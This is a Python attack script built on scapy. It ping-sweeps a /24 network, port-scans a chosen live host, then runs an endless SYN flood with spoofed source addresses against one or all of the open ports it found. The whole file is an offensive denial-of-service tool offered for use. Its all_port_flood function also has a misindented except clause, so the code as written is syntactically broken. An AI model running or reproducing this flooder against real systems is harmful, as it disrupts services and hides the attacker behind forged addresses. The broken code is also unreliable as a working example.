#!/usr/bin/env python

import sys, socket
import subprocess
from scapy.all import *

#Function to scan the network for Active IP Addresses based on PING responses.
def pinger(ip):
    status = subprocess.call(["ping", "-c", "2", ip], stdout=subprocess.PIPE)
    return(status)

network = input("Enter the network in x.y.z format (e.g.: 192.168.100 for 192.168.100.0 network): ") #User Input
startIP = int(input("Enter the start of IP range to scan: ")) #User Input for IP address to start from.
endIP = int(input("Enter the end of IP range to scan: ")) #User Input for IP address to scan to.

print("\nScan the network - ")

#Calls the PING scanner function and writes the active IP addresses to an array/list.
active_ip = []
for ip in range(startIP,endIP):
    dst = network+"."+str(ip)
    status = pinger(dst)
    if status == 0:
        print(dst, " is UP")
        active_ip.append(dst)
    else:
        pass
print("\nNetwork Scan Complete.")
print("\n----------------------------------------\n")

#Checks if the selected IP is in the actve IP addresses found above.
match = 0
while match != 1:
    dstIP = input("\nEnter the target IP address: ")
    for check_ip in active_ip:
        if dstIP == check_ip:
            match = 1
            print("\nValid IP entered.")
            break
        else:
            pass
    if match == 1:
        break
    else:
        print("\nIncorrect IP address " + dstIP + " entered. Try Again.\n")

#Define Port Range to scan.       
start_port = int(input("\nEnter start of port range to scan: "))
end_port = int(input("\nEnter end of port range to scan: "))

print("\nRunning port scan on the target....")

open_ports = []

#Scan the ports in the specified range:
for testport in range(start_port, end_port+1):
    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
    sock.settimeout(0.2)
    try:
        sock.connect( (dstIP, testport) )
        open_ports.append(testport)
    except:
        continue  
print("\nScan Complete")
print("\nThe open ports are:- ")

for output_ports in open_ports:
    print(output_ports)

print("\n----------------------------------------")

#Define Source IP address as the entire network range.
srcIP = network+".0/24"

#Function to flood a specific user-defined port.
def single_port_flood(sourceIP, destinationIP, destinationPORT):
    c = 1
    while c==1:
        try:
            IP_header = IP(src = sourceIP, dst = destinationIP, ttl=99)
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = destinationPORT)
            syn_packet = IP_header / TCP_header
            try:
                print("\nFlooding target IP " + destinationIP + " on " + str(destinationPORT) + " port. Please press CTRL+Z to stop/exit.")
                ans,unans = srloop(syn_packet, verbose = False)
            except Exception as e:
                print(e)
        except KeyboardInterrupt:
            print("\nYou have pressed Ctrl+C. The program will now exit.")
            sys.exit()

#Function to scan all open ports.
def all_port_flood(sourceIP, destinationIP, all_open_ports):
        c = 1
        while c==1:
                try:
                        IP_header = IP(src = sourceIP, dst = destinationIP, ttl=99)
                        TCP_header = TCP(flags = "S", sport = RandShort(), dport = all_open_ports)
                        syn_packet = IP_header / TCP_header
                        try:
                                print("\nFlooding target IP " + destinationIP + " on all open ports. Please press CTRL+Z to stop/exit.")
                                ans,unans = srloop(syn_packet, verbose = False)
                        except Exception as e:
                                print(e)
                             except KeyboardInterrupt:
                        print("\nYou have pressed Ctrl+C. The program will now exit.")
                        sys.exit()

choice_match = 0

while choice_match == 0:
    flood_port_choice = input("Do you wish to flood [1]Single port or [2]All open ports? (1/2): ")
    if int(flood_port_choice) == 1:
        dstPORT = int(input("Enter the port you wish to flood from above list of open ports: "))
        for dport in open_ports:
            if dstPORT == dport:
                choice_match = 1
                single_port_flood(srcIP, dstIP, dstPORT)
    elif int(flood_port_choice) == 2:
        choice_match = 1
        all_port_flood(srcIP, dstIP, open_ports)
    else:
        print("\nInvalid Choice. Try Again.")

#Changes to add -
#(1) Identify and calculate the Network ID and Subnet Mask automatically.
#(2) Skip active IP addresses for flooding.
#(3) Multi-threading.
#(4) More Scan/Flood options.